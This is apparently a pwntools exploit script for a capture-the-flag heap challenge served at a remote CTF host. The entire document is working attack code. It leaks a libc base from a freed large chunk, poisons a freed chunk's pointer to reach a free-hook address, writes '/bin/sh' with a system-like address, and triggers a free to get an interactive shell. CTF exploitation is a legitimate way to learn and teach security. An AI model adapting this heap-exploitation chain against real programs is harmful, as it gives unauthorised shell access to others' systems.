from pwn import *
context.arch='amd64'
context.log_level='debug'
def cmd(c):
	p.sendlineafter("> ",c)
def add(size,c='A',price=0.099):
	cmd("S")
	p.sendlineafter(": ",str(price))
	p.sendlineafter(": ",str(size))
	p.sendlineafter(": ",c)
def free(idx):
	cmd("B")
	p.sendlineafter(": ",str(idx+1))
def show():
	cmd("P")
def mam(idx,size,c):
	cmd("M")
	p.sendlineafter("?: ",str(idx+1))
	p.sendlineafter(": ","0.99")
	
	p.sendlineafter(": ",str(size))
	p.sendlineafter(": ",c)
	
#p=process('./pwn')
p=remote("challenge.ctf.games",32068)
add(0x420)
add(0x28)#1
free(0)
show()
p.readuntil("Name: ")
base=u64(p.readline()[:-1]+b'\0\0')-(0x7ffff7fadbe0-0x7ffff7dc2000)
log.warning(hex(base))

add(0x18)#2
add(0x18)#3
add(0x28)#4
add(0x28)#5
free(3)
free(2)

mam(2,0x18,p64(0x1eeb28+base-8))
free(4)
free(5)

add(0x18)
#add(0x18)
add(0x18,b"/bin/sh\0"+p64(0x55410+base))

free(7)
p.interactive()
